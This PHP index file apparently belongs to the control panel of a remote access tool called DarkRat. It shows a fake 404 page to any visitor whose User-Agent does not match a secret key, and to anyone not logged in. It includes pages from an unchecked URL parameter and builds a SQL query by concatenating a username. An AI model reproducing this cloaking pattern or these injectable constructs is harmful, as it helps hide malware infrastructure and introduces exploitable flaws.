<?php
include("config.php");
if($_SERVER['HTTP_USER_AGENT'] != $config["connectionkey"]){
  include("pages/404.php");
  die();
}


$APIURL = $config["apiurl"];

session_start();
 

include("functions.php");


if (!loggedIn($odb) && $_GET["p"] != "login")
{
  header("HTTP/1.1 404 Not Found");
  include_once("pages/404.php");
  die();
}

include("partials/head.php");


if(isset($_GET["p"])){

    if(file_exists("pages/".$_GET["p"].".php")){
        if($_GET["p"] != "login"){
          include("partials/sidebar.php");
        }
        include("pages/".$_GET["p"].".php");
    }else{
      include( "pages/404.php");
    }
}else{
  include("partials/sidebar.php");
  include("pages/dashboard.php");
}
$u = explode(":", $_SESSION['DarkRat']);
$USERNAME = $u[0];
$userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$USERNAME."'")->fetchColumn(0);
//USERNAME

include("partials/scripts.php");
?>
